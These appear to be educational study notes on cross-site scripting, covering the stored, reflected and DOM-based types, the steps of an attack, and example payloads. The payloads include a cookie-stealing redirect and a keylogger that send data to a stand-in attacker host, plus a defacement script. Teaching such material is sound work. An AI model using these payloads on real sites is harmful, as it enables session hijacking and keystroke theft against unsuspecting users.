### Reading Paper:

#### **What is Cross-Site Scripting (XSS)?**

1. **Definition:**
    
    - XSS is a vulnerability where attackers inject malicious scripts into trusted websites, which are then executed in the victim's browser.
        
2. **Types of XSS:**
    
    - **Stored XSS:** Malicious scripts are stored on the server (e.g., in a database).
        
    - **Reflected XSS:** Scripts are embedded in URLs and executed when the victim interacts with the link.
        
    - **DOM-based XSS:** Malicious scripts manipulate the client-side DOM without server interaction.
        

---

#### **An Example Malicious Anatomy of an XSS Attack:**

1. **Step 1: Injection Point:**
    
    - The attacker identifies input fields (e.g., comment sections, search boxes) that are not properly sanitized.
        
2. **Step 2: Malicious Payload:**
    
    - The attacker injects a script, such as:
        
        ```
        <script>alert('XSS attack!');</script>
        ```
        
3. **Step 3: Execution:**
    
    - When a victim visits the infected page or interacts with the vulnerable element, the script is executed in their browser.
        
4. **Step 4: Impact:**
    
    - Examples include stealing cookies, redirecting to malicious sites, or performing actions on behalf of the victim.
        

---

#### **An Example Malicious Script in an XSS Attack:**

1. **Stealing Cookies:**
    
    - Injected script:
        
        ```
        <script>
            document.location='http://malicious-site.com/steal?cookie=' + document.cookie;
        </script>
        ```
        
    - Effect:
        
        - Sends the victim's session cookies to the attacker's server.
            
2. **Defacing a Page:**
    
    - Injected script:
        
        ```
        <script>
            document.body.innerHTML = '<h1>You have been hacked!</h1>';
        </script>
        ```
        
    - Effect:
        
        - Modifies the content displayed on the page.
            
3. **Keylogging:**
    
    - Injected script:
        
        ```
        <script>
            document.addEventListener('keypress', function(event) {
                fetch('http://malicious-site.com/log', {
                    method: 'POST',
                    body: JSON.stringify({key: event.key})
                });
            });
        </script>
        ```
        
    - Effect:
        
        - Captures and sends keystrokes to the attacker.
            

---

### Bullet Points:

- **XSS Attack Anatomy:**
    
    - Find input vulnerabilities → Inject malicious script → Victim executes script → Impact (e.g., stealing cookies, defacing content).
        
- **Malicious Scripts Examples:**
    
    - **Stealing Cookies:** Redirects session data to an attacker.
        
    - **Defacing Content:** Modifies the webpage.
        
    - **Keylogging:** Captures user input and sends it to the attacker.
